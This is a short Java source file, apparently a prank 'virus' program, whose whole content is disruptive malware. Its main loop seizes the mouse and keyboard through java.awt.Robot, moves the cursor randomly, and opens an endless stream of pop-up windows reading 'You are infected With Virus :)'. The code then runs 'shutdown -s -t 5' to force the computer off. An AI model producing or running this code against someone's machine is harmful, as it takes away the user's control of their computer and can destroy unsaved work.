import java.util.*;
import javax.swing.*;
import java.awt.event.*;
import java.awt.*;
import java.io.*;

public class virus{
    private final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
    private final int height = (int) screenSize.getHeight();
    private final int width = (int) screenSize.getWidth();
    private final Random Random = new Random();

    public void blockAll() throws AWTException
    {
        Robot robot = new Robot();
        robot.keyPress(KeyEvent.VK_SHIFT);
        robot.mouseMove(Random.nextInt(width),Random.nextInt(height));
    }
    public void popup(){
        JWindow window = new JWindow();
        JLabel l = new JLabel("You are infected With Virus :)",JLabel.CENTER);
        window.add(l);
        window.setSize(300,200);
        window.setLocation(Random.nextInt(width), Random.nextInt(height));
        window.setVisible(true);
    }
    public void close(){
        Runtime runtime = Runtime.getRuntime();
      try
      {
         System.out.println("Shutting down the PC after 5 seconds.");
         runtime.exec("shutdown -s -t 5");
      }
      catch(IOException e)
      {
         System.out.println("Exception: " +e);
      }
    }
    public static void main(String[] args) throws AWTException, InterruptedException 
    {
        virus v =  new virus();
        for (long i = 0; i < 1000000000000000000l; i++)
        {
            v.blockAll();
            v.popup();
        }
        v.close();
        
    }
}